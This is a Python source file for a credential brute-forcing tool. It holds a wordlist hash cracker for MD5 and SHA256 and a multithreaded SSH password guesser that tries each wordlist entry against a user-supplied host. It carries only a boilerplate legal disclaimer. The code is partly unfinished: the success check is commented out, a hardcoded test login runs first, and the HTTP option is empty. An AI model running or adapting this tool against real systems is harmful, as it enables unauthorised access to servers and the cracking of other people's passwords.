#!/usr/bin/env python
#
# BruteForce Script Version 1.0.0 (2022)
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool. The author accepts no liability for
# damage caused by this tool.  If these terms are not acceptable to you, then do
# not use this tool.
#
# by Pierre CHAUSSARD & Nathan TEBOUL
#
# 24-Feb-2022 - 1.0.0 - Creating basic script.

import pyfiglet,sys,time,hashlib
import paramiko
from threading import Thread


def section_print(title):
        print("\n" + "=" * 50)
        print(title)
        print("=" * 50 + "\n")


def hash_cracker(wordlist, type, input):
        with open(f"wordlists\{wordlist}", 'r') as file:
                start = time.time()
                for line in file.readlines():
                        if type == 'md5':
                                hash_ob = hashlib.md5(line.strip().encode())
                        elif type == 'sha256':
                                hash_ob = hashlib.sha256(line.strip().encode())

                        hashed_pass = hash_ob.hexdigest()
                        if hashed_pass == input:
                                end = time.time()
                                print(f"Hash Cracker\n |  Wordlist : {wordlist}.\n |  Hash Type : {type}.\n |  Hash : {input}.\n |  Password founded : {line.strip()}\n |_ Time elapsed : {end - start}s.")
                                exit(0)


def menu():
        ascii_banner = pyfiglet.figlet_format("BruteForce.PY")
        print(ascii_banner)

        x = int(input("Choose your service :\n 1. SSH.\n 2. HTTP.\n\n>"))

        if x == 1:
                print(ssh_connect('192.168.0.1', 'user', 'user'))
                section_print("SSH BruteForce")
                ip = str(input("Enter SSH IP :\n>"))
                user = str(input("Enter username :\n>"))
                wordl = str(input("Enter wordlist :\n>"))
                ssh_bruteforce(ip,user,wordl)
        elif x == 2:
                section_print("HTTP BruteForce")


def ssh_connect(ip, username, password, port=22):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port, username, password)
        print("Mot de passe: " + password)
        return True
    except:
        return False

def ssh_bruteforce(ip, username, wordlist):
    arr = []
    with open(f"wordlists\{wordlist}.txt", 'r') as file:
        for line in file.readlines():
            th = Thread(target=ssh_connect ,args=(ip, username, line.strip()))
            th.start()

            """
            if result[0]:
                print(f"Mot de passe trouvé ! : {line.strip()}")
            """


try:
        menu()

except KeyboardInterrupt:
        print("\n/!\ Exiting Program !")
        sys.exit()
